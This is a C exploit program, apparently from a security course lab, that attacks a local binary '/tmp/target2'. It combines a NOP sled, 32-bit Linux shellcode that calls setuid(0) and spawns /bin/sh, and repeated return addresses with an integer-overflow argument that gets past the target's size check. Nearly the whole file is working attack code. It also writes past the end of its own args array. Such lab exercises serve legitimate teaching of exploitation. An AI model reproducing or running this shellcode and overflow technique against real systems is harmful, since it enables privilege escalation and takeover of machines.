#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;
  //the target structure for target2 is identical to target0 -- we therefore use the same args[1] as in sploit0
  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf\x5c\xfe\xff\xbf"; 
  //the main difference is that target2 is expecting a certain number of arguments. 
  //to meet the expected number of arguments, we added an additional arg to args
  //args[2] implements an integer overflow where we know that 65536 exceeds the integer value bounds 
  //and as such is modulo'd back to 0
  //from here we add 399 to that value to meet the size requirements set in target2
  args[2] = "65935";
  args[3] = NULL;
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}

